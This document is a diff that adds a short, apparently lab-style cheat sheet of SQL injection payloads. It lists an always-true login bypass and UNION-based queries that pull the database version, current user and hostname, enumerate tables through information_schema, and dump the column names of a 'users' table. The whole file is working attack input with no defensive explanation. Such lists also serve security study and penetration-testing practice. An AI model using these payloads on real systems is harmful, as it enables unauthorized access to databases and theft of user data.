@@ -1,0 +1,13 @@
+i. Always True Scenario
+'OR '1' = '1
+
+ii. Display Database Version, User, Name
+' union select 1,@@version#
+' union all select system_user(),user() #
+' union select null,@@hostname #
+
+iii. Display all the table field
+%' and 1=0 union select null, table_name from information_schema.tables #
+
+iv. Display all the columns field
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
